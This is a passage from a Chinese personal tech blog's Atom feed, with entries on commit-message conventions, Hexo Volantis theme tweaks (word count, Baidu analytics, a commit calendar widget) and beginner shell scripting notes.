target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg</a></li><li><code>raw.githubusercontent</code>：<a href="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg" target="_blank" rel="noopener">https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;不知道大家通常是如何访问图床的，我之前一直使用的方式是：&lt;code&gt;GitHub&lt;/code&gt; 图床 + &lt;code&gt;raw.githubusercontent&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;图片相关的资源全部放在&lt;code&gt;GitHub&lt;/code&gt;上，然后使用GitHub 提供的素材服务器&lt;code&gt;raw.githubusercontent&lt;/code&gt;去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。&lt;/p&gt;
&lt;p&gt;因此需要使用 CDN 来加速来优化资源加载速度。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    <category term="GitHub" scheme="https://www.0x2beace.com/categories/Tutorial/GitHub/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
  </entry>
  
  <entry>
    <title>如何写好Commit log</title>
    <link href="https://www.0x2beace.com/how-to-write-a-commit-log/"/>
    <id>https://www.0x2beace.com/how-to-write-a-commit-log/</id>
    <published>2020-07-10T01:22:51.000Z</published>
    <updated>2020-07-10T01:23:51.811Z</updated>
    
    <content type="html"><![CDATA[<p>其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。</p><p>这里就不过多介绍什么是<code>Git</code>了，本文的重点是<code>Commit Log</code>，如果还不清楚<code>Git</code>是什么，可以看一下我的<code>Git</code>系列的其他笔记。</p><a id="more"></a><h2 id="为什么要关注提交信息"><a href="#为什么要关注提交信息" class="headerlink" title="为什么要关注提交信息"></a>为什么要关注提交信息</h2><ol><li>加快<code>Reviewing Code</code>的过程</li><li>提醒自己或他人，某个提交具体增加了什么功能，改动了哪些地方</li><li>提高项目的整体质量</li></ol><h2 id="Angular-规范的-Commit-message-格式"><a href="#Angular-规范的-Commit-message-格式" class="headerlink" title="Angular 规范的 Commit message 格式"></a>Angular 规范的 Commit message 格式</h2><p>这种格式（规范）是我目前觉得相对其他格式（规范）而言，最容易接受、上手的一种。</p><p>其核心是每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;footer&gt;</span><br></pre></td></tr></table></figure><p>其中，Header 是必需的，Body 和 Footer 可以省略。</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header 部分只有一行，包括三个字段：<strong>type</strong>（必需）、<strong>scope</strong>（可选）和 <strong>subject</strong>（必需）。</p><p><strong>type</strong> 用于说明 <code>commit</code> 的类别，只允许使用下面 7 个标识。</p><ul><li><strong>feat</strong> 新功能（feature）</li><li><strong>fix</strong> 修补 bug</li><li><strong>docs</strong> 文档（documentation）</li><li><strong>style</strong> 格式（不影响代码运行的变动）</li><li><strong>refactor</strong> 重构（即不是新增功能，也不是修改 bug 的代码变动）</li><li><strong>test</strong> 增加测试</li><li><strong>chore</strong> 构建过程、辅助工具的变动</li><li><strong>perf</strong> 提高性能</li><li><strong>typo</strong> 打字错误</li></ul><p><strong>scope</strong> 用于说明 <code>commit</code> 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。</p><p><strong>subject</strong> 是 <code>commit</code> 目的的简短描述，不超过 50 个字符。</p><h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>Body 部分是对本次 commit 的详细描述，可以分成多行。</p><h3 id="Footer"><a href="#Footer" class="headerlink" title="Footer"></a>Footer</h3><p>Footer 部分只用于不兼容变动和关闭 Issue。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本来我自己一直使用的方式就是：<code>git commit -am &quot;fix login bug</code>，虽然并没有绝对的对错，但这显然不是最好的方式。</p><p>这种东西并没有强制性的规定，只要团队之间约定好，然后按照这个约定协作就好了。</p><p>所以我觉得在团队之间<code>commit</code>时，可以不用完全按照<code>Angular 规范的Commit message</code>格式去提交，可以按照以下约定来执行。</p><ul><li><code>commit</code>时，只用保留 Header 部分就好。</li><li><code>pull request</code>时，才需要 Header、Body、Footer 这三部分。</li></ul><p>另外<code>commit</code>时需要注意以下几点：</p><ul><li>创建短小而明确的<code>commit</code>，一句话说清楚。</li><li>一个小改动对应一次<code>commit</code>，不建议一大堆改动，一次<code>commit</code>。</li><li>如果添加的代码会使项目发生极大的变化，那么需要及时更新<code>remade</code>文件以向他人说明此次更改。</li></ul><h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docs: add FAQ in readme file</span><br><span class="line">feat: increase user login function</span><br><span class="line">fix: fix user login bug</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://ruby-china.org/topics/15737" target="_blank" rel="noopener">Git 如何写好 Commit Log？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。&lt;/p&gt;
&lt;p&gt;这里就不过多介绍什么是&lt;code&gt;Git&lt;/code&gt;了，本文的重点是&lt;code&gt;Commit Log&lt;/code&gt;，如果还不清楚&lt;code&gt;Git&lt;/code&gt;是什么，可以看一下我的&lt;code&gt;Git&lt;/code&gt;系列的其他笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Hexo Volantis 主题优化 | 增加分析与统计</title>
    <link href="https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/"/>
    <id>https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/</id>
    <published>2020-07-09T13:14:37.000Z</published>
    <updated>2020-07-09T13:19:08.344Z</updated>
    
    <content type="html"><![CDATA[<p>Volantis 默认支持 <a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子</a> 的访问统计，可以自行添加<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计</a>和 <a href="https://analytics.google.com/" target="_blank" rel="noopener">Google Analytics</a>。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><h2 id="分析与统计"><a href="#分析与统计" class="headerlink" title="分析与统计"></a>分析与统计</h2><h3 id="字数和阅读时长"><a href="#字数和阅读时长" class="headerlink" title="字数和阅读时长"></a>字数和阅读时长</h3><ol><li>Volantis 默认没有安装 <code>wordcount</code>插件，所以需要手动安装：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><ol start="2"><li>修改主题配置文件<code>themes/volantis/_config.yml</code>，将 wordcount 插件打开</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plugins:</span><br><span class="line">  ...</span><br><span class="line">  # 文章字数统计、阅读时长，开启需要安装插件: npm i --save hexo-wordcount</span><br><span class="line">  wordcount: true</span><br></pre></td></tr></table></figure><ol start="3"><li>继续修改主题配置文件<code>themes/volantis/_config.yml</code>，将 <code>wordcount</code> 放在需要显示的 meta 位置：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 布局</span><br><span class="line">layout:</span><br><span class="line">  on_list:</span><br><span class="line">    meta: [..., wordcount, ...]</span><br><span class="line">  on_page:</span><br><span class="line">    meta:</span><br><span class="line">      header: [..., wordcount, ...]</span><br><span class="line">      footer: [..., wordcount, ...]</span><br></pre></td></tr></table></figure><h3 id="百度统计"><a href="#百度统计" class="headerlink" title="百度统计"></a>百度统计</h3><p>百度统计是百度推出的一款免费的专业网站流量分析工具，能够告诉用户访客是如何找到并浏览用户的网站，在网站上做了些什么，非常有趣，接下来我们把百度统计添加到自己博客当中。</p><ol><li>访问<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计首页</a>，注册一个账号后登陆，添加你的博客网站。</li></ol><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200709204712.png" alt=""></p><ol start="2"><li><p>点击获取代码，复制该代码。</p></li><li><p>在主题配置文件中，增加以下内容：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnzz: true</span><br></pre></td></tr></table></figure><p>用于设置是否开启百度统计。</p><ol start="4"><li>在<code>themes/volantis/layout/_partial</code>目录下，新建一个<code>cnzz.ejs</code>文件，将刚才复制的内容粘贴进去：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.cnzz)&#123; %&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var _hmt &#x3D; _hmt || [];</span><br><span class="line">    (function () &#123;</span><br><span class="line">        var hm &#x3D; document.createElement(&quot;script&quot;);</span><br><span class="line">        hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">        var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0];</span><br><span class="line">        s.parentNode.insertBefore(hm, s);</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>最后将以下内容放在网站首页的尾部<code>themes/volantis/layout/_partial/footer.ejs</code>中：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(&#39;cnzz&#39;) %&gt;</span><br></pre></td></tr></table></figure><p>完成以上所有操作之后，可以在<a href="https://tongji.baidu.com/sc-web/10000236600/home/site/index" target="_blank" rel="noopener">百度统计管理页面</a>检查代码是否安装正确，如果正确安装，通常二十分钟之后就可以看到网站的分析数据了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Volantis 默认支持 &lt;a href=&quot;http://busuanzi.ibruce.info/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;不蒜子&lt;/a&gt; 的访问统计，可以自行添加&lt;a href=&quot;https://tongji.baidu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;百度统计&lt;/a&gt;和 &lt;a href=&quot;https://analytics.google.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Google Analytics&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Hexo" scheme="https://www.0x2beace.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo Volantis 主题优化 | 添加日历图</title>
    <link href="https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/"/>
    <id>https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/</id>
    <published>2020-07-09T13:07:08.000Z</published>
    <updated>2020-07-09T13:12:15.183Z</updated>
    
    <content type="html"><![CDATA[<p>一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。</p><p>默认效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709204832.png" alt=""></p><p>因为我使用的Hexo 主题是<code>Volantis</code>、而该主题目前并没有集成该控件，所以需要手动配置。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><p>Volantis 低版本可能会不适用于本文介绍的方法，可以参考 <code>YINUXY</code> 的 <a href="https://cloud.tencent.com/developer/article/1597223" target="_blank" rel="noopener">Hexo主题美化 | 给你的博客加上GITHUB日历云和分类</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li><p>在主题配置文件 <code>themes\volantis\_config.yml</code> 下添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postCalendar: true</span><br></pre></td></tr></table></figure><p>用于设置在归档页面中是否显示’文章日历’控件，如果不想显示，设置为 <code>false</code> 即可。</p></li><li><p>在归档页面 <code>themes/volantis/layout/archive.ejs</code> 添加以下代码：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;calendar&quot;&gt;</span><br><span class="line">&lt;% if (theme.postCalendar) &#123; %&gt;</span><br><span class="line">&lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>具体添加位置：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709205348.png" alt="IMAGE"></p><p>这里会根据主题配置文件中的<code>postCalendar</code>的值，来判断是否需要渲染。</p><ol start="3"><li>点击下载日历样式文件 <code>post-calendar.ejs</code>，放置于<code>themes/volantis/layout/_widget</code>目录下。</li></ol><p>将其中的第 16 行，替换成以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>至此已经完成了，使用<code>hexo generate &amp;&amp; hexo server</code>查看是否可以正常加载日历图。</p><p>默认的样式是高仿<code>gittee</code>，如果觉得不满意，可以参考<a href="https://echarts.apache.org/zh/option.html#calendar" target="_blank" rel="noopener">官方文档</a>自定义。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/cungudafa/article/details/106420842" target="_blank" rel="noopener">hexo（sakura）仿gitee添加文章贡献度日历图（echarts）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。&lt;/p&gt;
&lt;p&gt;默认效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709204832.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;因为我使用的Hexo 主题是&lt;code&gt;Volantis&lt;/code&gt;、而该主题目前并没有集成该控件，所以需要手动配置。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Hexo" scheme="https://www.0x2beace.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>编写第一个Shell 脚本</title>
    <link href="https://www.0x2beace.com/write-the-first-shell-script/"/>
    <id>https://www.0x2beace.com/write-the-first-shell-script/</id>
    <published>2020-07-08T13:56:46.000Z</published>
    <updated>2020-07-08T13:59:47.029Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。</p><a id="more"></a><h2 id="什么是-shell-脚本"><a href="#什么是-shell-脚本" class="headerlink" title="什么是 shell 脚本"></a>什么是 shell 脚本</h2><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h2 id="创建第一个shell-脚本"><a href="#创建第一个shell-脚本" class="headerlink" title="创建第一个shell 脚本"></a>创建第一个shell 脚本</h2><p>下面我们来创建第一个 shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ vim showdate</span><br><span class="line"></span><br><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line"># this script displays the date and who&#39;s logged on</span><br><span class="line">date</span><br><span class="line">who</span><br></pre></td></tr></table></figure><p>大功告成！这样就完成了一个简单的 shell 脚本的创建，是不是很简单！不过有以下几点需要注意：</p><ol><li>shell 脚本的名称不是一定需要用 .sh 来结尾，只是用 .sh 结尾会让其他人一目了然知道这是一个 shell 脚本文件。</li><li>在创建shell 脚本时，必须在第一行指定要使用的 shell，且格式固定为：<code>#!</code>开头。</li><li>第二行的井号作为注释行。</li></ol><p>运行shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">showdate</span><br><span class="line">$ .&#x2F;showdate</span><br><span class="line">bash: permission denied: .&#x2F;showdate</span><br><span class="line">$ sudo .&#x2F;showdate</span><br><span class="line">sudo: .&#x2F;showdate: command not found</span><br><span class="line">$ chmod u+x showdate</span><br><span class="line">$ .&#x2F;showdate</span><br></pre></td></tr></table></figure><p>创建完 shell 脚本，想要运行，有两种方案：</p><ol><li>将 shell 脚本所处的目录添加到 PATH 环境变量中;</li><li>在提示符中用绝对路径或者是相对路径来引用 shell 脚本文件;</li></ol><p>在上面的例子中，用的是绝对路径的方式来执行shell 脚本，使用单点操作符表示当前目录下的文件。</p><p>需要注意的是，因为文件夹权限的关系，而不能直接用 sudo 命令去执行，因为sudo 命令会检查showdate 并不在sudo 命令列表中。</p><p>所以正解是：修改该文件的文件夹权限。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>对于Shell编程的理解</title>
    <link href="https://www.0x2beace.com/understanding-of-shell-programming/"/>
    <id>https://www.0x2beace.com/understanding-of-shell-programming/</id>
    <published>2020-07-08T13:45:40.000Z</published>
    <updated>2020-07-08T13:55:36.897Z</updated>
    
    <content type="html"><![CDATA[<p>在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。</p><p>计算机语言可以分为两大类：</p><ol><li>低级语言</li><li>高级语言</li></ol><a id="more"></a><p>低级语言包括：<strong>机器语言</strong>和<strong>汇编语言</strong>。</p><p>高级语言包括：<strong>静态语言</strong>和<strong>动态语言</strong>。</p><p>这里就不对机器语言和汇编语言做介绍了，今天的主角是高级语言下的动态语言。</p><h3 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h3><p><strong>动态语言又叫做脚本语言。</strong></p><p>它和传统的静态语言的区别就在于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前者的运行过程为：编写-&gt;解释-&gt;执行</span><br><span class="line">而后者的运行过程为：编写-&gt;编译-&gt;链接-&gt;执行</span><br></pre></td></tr></table></figure><p>脚本语言的优势就在于 只要有一个可以写代码的编辑器和能解释执行的脚本解释器就行了。</p><p>这样一想，也就明白了为什么搭建<code>Python</code>的开发环境远比<code>C#</code>要快，因为它只要安装一个解释器就好了。</p><blockquote><p>动态语言与静态语言存在的争议之一：</p></blockquote><p>在静态语言中，写代码时必须知道每个变量的类型; 而在动态语言中，随便什么时候，你都可以把变量设为任意类型的值。</p><h3 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h3><p>最初在学习<code>Shell</code>脚本时，产生过这样一个问题：<br><strong>为什么还能用<code>PHP</code>写<code>Shell</code>脚本？</strong></p><p>当时就很不理解。这里就反应了两个问题：</p><ol><li>对<code>PHP</code>的理解不深</li><li>对<code>Shell</code>脚本的理解不深</li></ol><p><strong>理论上讲，只要一门语言提供了解释器，这门语言就可以胜任脚本编程。</strong></p><p>所以用 <code>PHP</code> 可以写 <code>Shell</code> 脚本，就没有什么好奇怪的了。<br>你可能会问：这句话里面的 <code>Shell</code>怎么理解？</p><p>还记得吗，<code>Shell</code>的概念是什么？</p><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h3 id="脚本语言的分类"><a href="#脚本语言的分类" class="headerlink" title="脚本语言的分类"></a>脚本语言的分类</h3><p>脚本语言又可以分为以下两大类：</p><ol><li><code>Shell</code>脚本</li><li>通用动态语言</li></ol><h5 id="常见的Shell脚本："><a href="#常见的Shell脚本：" class="headerlink" title="常见的Shell脚本："></a>常见的Shell脚本：</h5><ul><li>sh</li><li>bash</li><li>csh</li><li>ksh</li><li>tcsh</li><li>zsh</li><li>AppleScript </li></ul><h5 id="常见的脚本语言"><a href="#常见的脚本语言" class="headerlink" title="常见的脚本语言"></a>常见的脚本语言</h5><ul><li>JavaScript</li><li>Perl</li><li>PHP</li><li>Python</li><li>Ruby</li><li>VBScript</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。&lt;/p&gt;
&lt;p&gt;计算机语言可以分为两大类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;低级语言&lt;/li&gt;
&lt;li&gt;高级语言&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>关于Linux的Shell、Shell脚本、Shell环境的理解</title>
    <link href="https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/"/>
    <id>https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/</id>
    <published>2020-07-08T13:40:01.000Z</published>
    <updated>2020-07-08T13:52:22.046Z</updated>
    
    <content type="html"><![CDATA[<p>如标题所示，这片笔记主要目的是加深对<code>Linux</code>的<code>Shell</code>、<code>Shell脚本</code>、<code>Shell环境</code>的理解。</p><a id="more"></a><h2 id="什么是Shell？"><a href="#什么是Shell？" class="headerlink" title="什么是Shell？"></a>什么是Shell？</h2><ul><li><p>在回答这个问题之前，我们先来考虑一个问题：人是如何跟计算机打交道的？或者说怎样让计算机按照我们的要求完成某个任务？</p><ul><li>现在和计算机交互的方式很简单，直接用图形界面的工具就好了，想要计算机完成某个任务，通过操作图形界面的工具就能到达目的。</li><li>那么在以前呢？在那个计算机还没有这么先进的时代呢？人们又是如何让计算完成某个任务。通过“命令”的方式告诉计算机我需要你帮你完成这件事。这个“命令”又是怎么告诉计算机的呢？通过一个交互工具。这个工具可以实现与计算机之间的“你问我答，你说我做”的功能。</li></ul></li><li><p><code>Shell</code>就是一种应用程序（注意：我这里用的是一种）。</p></li><li><p>这个应用程序提供了一个界面（方便我们与计算机进行交互），用户通过这个界面访问操作系统内核的服务。</p></li></ul><h2 id="什么是Shell脚本？"><a href="#什么是Shell脚本？" class="headerlink" title="什么是Shell脚本？"></a>什么是Shell脚本？</h2><p><code>Shell</code> 脚本（<code>Shell Script</code>），是一种为 <code>Shell</code> 编写的脚本程序。</p><blockquote><p>Shell 脚本编程有两种方式</p></blockquote><ol><li>交互式（Interactive）：用户每输入一条命令就立即执行。</li><li>批处理（Batch）：由用户事先编写好一个完整的<code>Shell</code>脚本，<code>Shell</code>会一次性执行脚本中诸多的命令。</li></ol><h2 id="什么是Shell环境"><a href="#什么是Shell环境" class="headerlink" title="什么是Shell环境"></a>什么是Shell环境</h2><p><code>Shell</code>编程跟<code>java</code>、<code>php</code>编程一样，只要有一个<strong>能编写代码的文本编辑器</strong>和一个<strong>能解释执行的脚本解释器</strong>就可以了。</p><h3 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h3><ul><li><code>Linux</code> 默认安装了 <code>Shell</code> 解释器。</li><li>在<code>Linux</code>中，主流的 <code>Shell</code> 是 <code>Bash</code>。</li></ul><p>在一般情况下，人们并不区分 <code>Bourne Shell</code> 和 <code>Bourne Again Shell</code>，所以，像 <code>#!/bin/sh</code>，它同样也可以改为 <code>#!/bin/bash</code>。</p><h3 id="0x02-Mac-OS"><a href="#0x02-Mac-OS" class="headerlink" title="0x02 Mac OS"></a>0x02 Mac OS</h3><ul><li>Mac OS不仅带了sh、bash这两个最基础的解释器，还内置了ksh、csh、zsh等不常用的解释器。</li></ul><h3 id="0x03-Windows"><a href="#0x03-Windows" class="headerlink" title="0x03 Windows"></a>0x03 Windows</h3><p>Windows 出厂时没有内置 <code>Shell</code> 解释器，通常我们都是安装<code>cygwin</code>或者<code>mingw</code> 模拟器来Linux环境。</p><ul><li><a href="http://www.cygwin.com/" target="_blank" rel="noopener">Cygwin</a></li><li><a href="http://www.mingw.org/" target="_blank" rel="noopener">Mingw</a></li></ul><p>如Git的交互界面就是由<code>Mingw</code>模拟器提供的<code>Bash</code>。</p><h4 id="脚本解释器"><a href="#脚本解释器" class="headerlink" title="脚本解释器"></a>脚本解释器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash &#x3D;&gt; Bourne Again Shell（&#x2F;bin&#x2F;bash）</span><br><span class="line">sh &#x3D;&gt;  Bourne Shell（&#x2F;usr&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;sh）</span><br><span class="line">csh &#x3D;&gt; C Shell（&#x2F;usr&#x2F;bin&#x2F;csh）</span><br><span class="line">ksh &#x3D;&gt; K Shell（&#x2F;usr&#x2F;bin&#x2F;ksh）</span><br><span class="line">Shell for Root（&#x2F;sbin&#x2F;sh）</span><br></pre></td></tr></table></figure><h4 id="第一个Shell脚本"><a href="#第一个Shell脚本" class="headerlink" title="第一个Shell脚本"></a>第一个Shell脚本</h4><p>打开Bash或者任何一个文本编辑器，新建一个文件 Hello.sh，扩展名为<code>sh</code>(sh代表shell)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#第一个Shell脚本</span><br><span class="line">#作用是列出当前目录下的所有文件的详情信息</span><br><span class="line">PWDS&#x3D;echo &#96;pwd&#96;</span><br><span class="line">cd $PWDS</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure><p>上面这个脚本中，有三种不同的元素：</p><ol><li>第一行的脚本声明（<code>#!</code>）用来告诉系统使用<strong>哪种 Shell 解释器</strong>来执行该脚本；</li><li>第二行的注释信息（<code>#</code>）是对脚本功能和某些命令的介绍信息，使得看到脚本时能快速反应是做什么的。</li><li>剩下没有前缀标识的就是 